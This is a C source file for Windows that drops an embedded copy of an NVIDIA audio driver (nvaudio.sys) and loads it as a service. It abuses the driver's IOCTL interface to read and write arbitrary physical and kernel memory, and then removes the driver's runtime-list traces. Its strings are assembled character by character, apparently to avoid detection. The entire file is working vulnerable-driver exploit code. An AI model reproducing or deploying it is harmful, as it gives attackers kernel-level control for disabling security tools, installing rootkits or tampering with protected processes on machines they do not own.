
#include "main.h"

typedef PVOID (*EncodePayLoad_t)(PVOID Request, LONG EncodeCode, ULONGLONG* EncryptionKey);
static EncodePayLoad_t EncodePayLoad = 0;
static PVOID NvAudioLibrary          = 0;
extern ULONGLONG DriverResource[5517];

static NTSTATUS ReadSystemMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG Source,
    _Out_writes_bytes_(Length) PVOID Destination,
    _In_ SIZE_T Length);

static NTSTATUS WriteSystemMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG Destination,
    _In_reads_bytes_(Length) PVOID Source,
    _In_ SIZE_T Length);

static NTSTATUS DeviceControl(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG* EncryptionKey,
    _In_ PVOID Buffer,
    _In_ SIZE_T BufferLength);

static NTSTATUS ReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG PhysicalAddress,
    _Out_writes_bytes_(BufferLength) PVOID Buffer,
    _In_ SIZE_T BufferLength);

static NTSTATUS WritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG PhysicalAddress,
    _In_reads_bytes_(BufferLength) PVOID Buffer,
    _In_ SIZE_T BufferLength);

static NTSTATUS GetPhysicalAddress(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG VirtualAddress,
    _Out_ PULONGLONG PhysicalAddress);

#pragma alloc_text(PAGE, LoadDriver)
#pragma alloc_text(PAGE, UnloadDriver)
#pragma alloc_text(PAGE, DeviceControl)
#pragma alloc_text(PAGE, GetPhysicalAddress)
#pragma alloc_text(PAGE, ReadPhysicalMemory)
#pragma alloc_text(PAGE, WritePhysicalMemory)
#pragma alloc_text(PAGE, ReadSystemMemory)
#pragma alloc_text(PAGE, WriteSystemMemory)

NTSTATUS LoadDriver(_Out_ PDEVICE_DRIVER_OBJECT DriverObject)
{
    UNICODE_STRING UnicodeString;
    NTSTATUS Status;
    HANDLE TokenHandle;
    TOKEN_PRIVILEGES Privileges;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    HANDLE DeviceHandle;

    WCHAR DeviceName[] = {L'\\', L'D', L'e', L'v', L'i', L'c', L'e', L'\\', L'N', L'V', L'R',
                          L'0',  L'I', L'n', L't', L'e', L'r', L'n', L'a',  L'l', L'\0'};

    WCHAR ServiceName[]
        = {L'\\', L'R', L'e', L'g',  L'i',  L's', L't', L'r', L'y', L'\\', L'M', L'a',  L'c',
           L'h',  L'i', L'n', L'e',  L'\\', L'S', L'Y', L'S', L'T', L'E',  L'M', L'\\', L'C',
           L'u',  L'r', L'r', L'e',  L'n',  L't', L'C', L'o', L'n', L't',  L'r', L'o',  L'l',
           L'S',  L'e', L't', L'\\', L'S',  L'e', L'r', L'v', L'i', L'c',  L'e', L's',  L'\\',
           L'N',  L'V', L'R', L'0',  L'I',  L'n', L't', L'e', L'r', L'n',  L'a', L'l',  L'\0'};

    WCHAR DriverFullPath[]
        = {L'\\', L'S', L'y', L's', L't', L'e', L'm', L'R', L'o', L'o', L't', L'\\',
           L'n',  L'v', L'a', L'u', L'd', L'i', L'o', L'.', L's', L'y', L's', L'\0'};

    WCHAR DriverBaseName[]
        = {L'n', L'v', L'a', L'u', L'd', L'i', L'o', L'.', L's', L'y', L's', L'\0'};

    if ARGUMENT_PRESENT (DriverObject)
        RtlZeroMemory(DriverObject, sizeof(DEVICE_DRIVER_OBJECT));

    //
    // Set Privilege.
    //

    Privileges.PrivilegeCount              = 1;
    Privileges.Privileges[0].Attributes    = SE_PRIVILEGE_ENABLED;
    Privileges.Privileges[0].Luid.LowPart  = SE_LOAD_DRIVER_PRIVILEGE;
    Privileges.Privileges[0].Luid.HighPart = 0;

    Status = NtOpenThreadToken(
        NtCurrentThread(),
        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
        FALSE,
        &TokenHandle);

    if (Status == STATUS_NO_TOKEN) {
        Status = NtOpenProcessToken(
            NtCurrentProcess(),
            TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
            &TokenHandle);
    }

    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    Status = NtAdjustPrivilegesToken(
        TokenHandle,
        FALSE,
        &Privileges,
        sizeof(TOKEN_PRIVILEGES),
        NULL,
        NULL);

    NtClose(TokenHandle);

    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    RtlInitUnicodeString(&UnicodeString, DeviceName);
    InitializeObjectAttributes(&ObjectAttributes, &UnicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);
    Status = NtOpenFile(
        DeviceHandle,
        FILE_ALL_ACCESS,
        &ObjectAttributes,
        &IoStatusBlock,
        (FILE_SHARE_READ | FILE_SHARE_WRITE),
        FILE_ATTRIBUTE_DEVICE);

    if NT_ERROR (Status) {
        //
        // Write File to Disk.
        //

        Status = RtlFileWrite(DriverFullPath, DriverResource, sizeof(DriverResource));
        if NT_ERROR (Status) {
            DEBUG_PRINT_NTSTATUS(Status);
            return Status;
        }

        //
        // Set registry and load driver.
        //
        WCHAR v4[] = {L'I', L'm', L'a', L'g', L'e', L'P', L'a', L't', L'h', L'\0'};
        WCHAR v5[] = {L'T', L'y', L'p', L'e', L'\0'};

        Status = RtlRegSetKeyValueSz(ServiceName, v4, DriverFullPath);

        if NT_SUCCESS (Status)
            Status = RtlRegSetKeyValue32(ServiceName, v5, 1);

        if NT_ERROR (Status) {
            RtlRegDeleteKey(ServiceName);
            RtlFileDelete(DriverFullPath);

            DEBUG_PRINT_NTSTATUS(Status);
            return Status;
        }

        RtlInitUnicodeString(&UnicodeString, ServiceName);
        Status = NtLoadDriver(&UnicodeString);

        if NT_ERROR (Status) {
            RtlRegDeleteKey(ServiceName);
            RtlFileDelete(DriverFullPath);

            DEBUG_PRINT_NTSTATUS(Status);
            return Status;
        }

        //
        // Open device handle
        //

        RtlInitUnicodeString(&UnicodeString, DeviceName);
        InitializeObjectAttributes(
            &ObjectAttributes,
            &UnicodeString,
            OBJ_CASE_INSENSITIVE,
            NULL,
            NULL);

        Status = NtOpenFile(
            DeviceHandle,
            FILE_ALL_ACCESS,
            &ObjectAttributes,
            &IoStatusBlock,
            (FILE_SHARE_READ | FILE_SHARE_WRITE),
            FILE_ATTRIBUTE_DEVICE);

        if NT_ERROR (Status) {
            RtlInitUnicodeString(&UnicodeString, ServiceName);
            NtUnloadDriver(&UnicodeString);
            RtlRegDeleteKey(ServiceName);
            RtlFileDelete(DriverFullPath);

            DEBUG_PRINT_NTSTATUS(Status);
            return Status;
        }
    }

    //
    // Init specified driver routine.
    //

    if (NvAudioLibrary == 0) {
        RtlInitUnicodeString(&UnicodeString, DriverBaseName);
        Status = LdrLoadDll(NULL, NULL, &UnicodeString, &NvAudioLibrary);

        if NT_ERROR (Status) {
            RtlInitUnicodeString(&UnicodeString, ServiceName);
            NtUnloadDriver(&UnicodeString);
            RtlRegDeleteKey(ServiceName);
            RtlFileDelete(DriverFullPath);

            DEBUG_PRINT_NTSTATUS(Status);
            return Status;
        }

        EncodePayLoad = (EncodePayLoad_t)((PCHAR)NvAudioLibrary + 0x2130);
    }

    //
    // Remove Driver RuntimeList.
    //

    if NT_SUCCESS (Status) {
        DriverObject->DeviceHandle = DeviceHandle;
        DriverObject->ReadMemory   = ReadSystemMemory;
        DriverObject->WriteMemory  = WriteSystemMemory;

        if (RemoveDriverRuntimeList(
                DriverObject,
                DriverBaseName,
                RtlImageNtHeader(NvAudioLibrary)->FileHeader.TimeDateStamp)
            == FALSE) {
            LdrUnloadDll(NvAudioLibrary);
            NvAudioLibrary = 0;

            RtlInitUnicodeString(&UnicodeString, ServiceName);
            NtUnloadDriver(&UnicodeString);
            RtlRegDeleteKey(ServiceName);
            RtlFileDelete(DriverFullPath);

            Status = STATUS_ACCESS_DENIED;
            DEBUG_PRINT_NTSTATUS(Status);
            return Status;
        }
    }

    return Status;
}

NTSTATUS UnloadDriver(_In_ PDEVICE_DRIVER_OBJECT DriverObject)
{
    NTSTATUS Status;
    UNICODE_STRING UnicodeString;

    WCHAR ServiceName[]
        = {L'\\', L'R', L'e', L'g',  L'i',  L's', L't', L'r', L'y', L'\\', L'M', L'a',  L'c',
           L'h',  L'i', L'n', L'e',  L'\\', L'S', L'Y', L'S', L'T', L'E',  L'M', L'\\', L'C',
           L'u',  L'r', L'r', L'e',  L'n',  L't', L'C', L'o', L'n', L't',  L'r', L'o',  L'l',
           L'S',  L'e', L't', L'\\', L'S',  L'e', L'r', L'v', L'i', L'c',  L'e', L's',  L'\\',
           L'N',  L'V', L'R', L'0',  L'I',  L'n', L't', L'e', L'r', L'n',  L'a', L'l',  L'\0'};

    WCHAR DriverFullPath[]
        = {L'\\', L'S', L'y', L's', L't', L'e', L'm', L'R', L'o', L'o', L't', L'\\',
           L'n',  L'v', L'a', L'u', L'd', L'i', L'o', L'.', L's', L'y', L's', L'\0'};

    if (NvAudioLibrary) {
        LdrUnloadDll(NvAudioLibrary);
        NvAudioLibrary = 0;
    }

    if (DriverObject->DeviceHandle) {
        Status                     = NtClose(DriverObject->DeviceHandle);
        DriverObject->DeviceHandle = NULL;

        if NT_ERROR (Status) {
            DEBUG_PRINT_NTSTATUS(Status);
        }

        RtlZeroMemory(DriverObject, sizeof(DEVICE_DRIVER_OBJECT));
    }

    // ==========================================================
    // Unload Driver.
    // ==========================================================
    RtlInitUnicodeString(&UnicodeString, ServiceName);
    Status = NtUnloadDriver(&UnicodeString);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
    }

    Status = RtlRegDeleteKey(ServiceName);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
    }

    Status = RtlFileDelete(DriverFullPath);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
    }

    return Status;
}

static NTSTATUS DeviceControl(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG* EncryptionKey,
    _In_ PVOID Buffer,
    _In_ SIZE_T BufferLength)
{
    IO_STATUS_BLOCK IoStatus;
    NTSTATUS Status;

    EncodePayLoad(Buffer, 0x38, EncryptionKey);

    Status = NtDeviceIoControlFile(
        DeviceHandle,
        NULL,
        NULL,
        NULL,
        &IoStatus,
        NVAUDIO_IOCTL_CODE,
        Buffer,
        (ULONG)BufferLength,
        Buffer,
        (ULONG)BufferLength);
    if (Status == STATUS_PENDING) {
        Status = NtWaitForSingleObject(DeviceHandle, FALSE, NULL);
    }

    return Status;
}

static NTSTATUS ReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG PhysicalAddress,
    _Out_writes_bytes_(BufferLength) PVOID Buffer,
    _In_ SIZE_T BufferLength)
{
    NVAUDIO_REQUEST Request;
    Request.RequestClass  = READ_PHYSICAL_MEMORY;
    Request.NumberOfBytes = (LONG)BufferLength;
    Request.Destination   = (LONGLONG)Buffer;
    Request.Source        = PhysicalAddress;

    return DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST));
}

static NTSTATUS WritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG PhysicalAddress,
    _In_reads_bytes_(BufferLength) PVOID Buffer,
    _In_ SIZE_T BufferLength)
{
    NVAUDIO_REQUEST Request;
    Request.RequestClass  = WRITE_PHYSICAL_MEMORY;
    Request.NumberOfBytes = (LONG)BufferLength;
    Request.Destination   = PhysicalAddress;
    Request.Source        = (LONGLONG)Buffer;

    return DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST));
}

static NTSTATUS GetPhysicalAddress(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG VirtualAddress,
    _Out_ PULONGLONG PhysicalAddress)
{
    NVAUDIO_REQUEST Request;
    NTSTATUS Status;
    Request.RequestClass    = GET_PHYSICAL_ADDRESS;
    Request.PhysicalAddress = 0;
    Request.VirtualAddress  = VirtualAddress;
    *PhysicalAddress        = 0;

    Status = DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST));
    if NT_SUCCESS (Status) {
        *PhysicalAddress = Request.PhysicalAddress;
    }
    return Status;
}

static NTSTATUS ReadSystemMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG Source,
    _Out_writes_bytes_(Length) PVOID Destination,
    _In_ SIZE_T Length)
{
    ULONGLONG PhysicalAddress;
    NTSTATUS Status;

    Status = GetPhysicalAddress(DeviceHandle, Source, &PhysicalAddress);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    return ReadPhysicalMemory(DeviceHandle, PhysicalAddress, Destination, Length);
}

static NTSTATUS WriteSystemMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG Destination,
    _In_reads_bytes_(Length) PVOID Source,
    _In_ SIZE_T Length)
{
    ULONGLONG PhysicalAddress;
    NTSTATUS Status;

    Status = GetPhysicalAddress(DeviceHandle, Destination, &PhysicalAddress);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    return WritePhysicalMemory(DeviceHandle, PhysicalAddress, Source, Length);
}
